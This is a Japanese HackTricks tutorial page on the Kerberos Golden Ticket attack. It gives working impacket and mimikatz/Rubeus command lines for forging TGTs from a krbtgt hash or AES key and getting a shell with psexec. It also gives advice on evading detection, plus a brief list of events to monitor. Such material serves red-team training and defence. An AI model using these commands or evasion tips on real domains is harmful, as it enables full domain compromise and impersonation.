# ゴールデンチケット

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有する。

</details>

## ゴールデンチケット

**krbtgt ADアカウントのNTLMハッシュを使用して**、有効な**任意のユーザーのTGT**を作成できます。TGSではなくTGTを偽造する利点は、ドメイン内の**任意のサービス**（またはマシン）にアクセスし、なりすましたユーザーとして行動できることです。
さらに、**krbtgt**の**資格情報**は自動的に**変更されることはありません**。

**krbtgt**アカウントの**NTLMハッシュ**は、ドメイン内の任意のDCの**lsassプロセス**または**NTDS.ditファイル**から**取得**できます。また、[lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump)モジュールのMimikatzやimpacketの例[secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)を使用して、**DCsync攻撃**を通じてそのNTLMを取得することも可能です。通常、使用される技術に関係なく、**ドメイン管理者権限または同様の権限が必要です**。

また、**AES Kerberosキー（AES128およびAES256）を使用してチケットを偽造することが可能であり、かつ望ましい**（運用上の安全性）ことも考慮する必要があります。

{% code title="Linuxから" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
```
{% endcode %}

{% code title="Windowsから" %}
```
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**ゴールデンチケットを注入したら**、共有ファイル**(C$)**にアクセスし、サービスやWMIを実行できるため、**psexec** や **wmiexec** を使用してシェルを取得できます（winrm経由ではシェルを取得できないようです）。

### 一般的な検出を回避する

ゴールデンチケットを検出する最も一般的な方法は、ネットワーク上での**Kerberosトラフィックを検査する**ことです。デフォルトでは、MimikatzはTGTを**10年間有効**に署名しますが、これは後続のTGSリクエストで異常として目立ちます。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

開始オフセット、期間、最大更新回数（すべて分単位）を制御するには、`/startoffset`、`/endin`、`/renewmax` パラメータを使用します。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
残念ながら、TGTの寿命は4769のイベントログに記録されていないため、この情報はWindowsイベントログには見つかりません。しかし、**4769のイベントが**_**事前の4768なしに**_**見られることを相関させることができます**。TGSをTGTなしで要求することは**不可能**であり、TGTが発行された記録がない場合、オフラインで偽造されたと推測できます。

この検出を**回避する**ためには、ダイヤモンドチケットを確認してください：

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### 軽減策

* 4624: アカウントログオン
* 4672: 管理者ログオン
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

防御者が行うことができる他の小さなトリックは、デフォルトのドメイン管理者アカウントなどの**敏感なユーザーに対する4769のアラート**です。

[**ired.teamでGolden Ticketについての詳細情報。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>AWSのハッキングをゼロからヒーローまで学ぶには、</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをご覧ください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
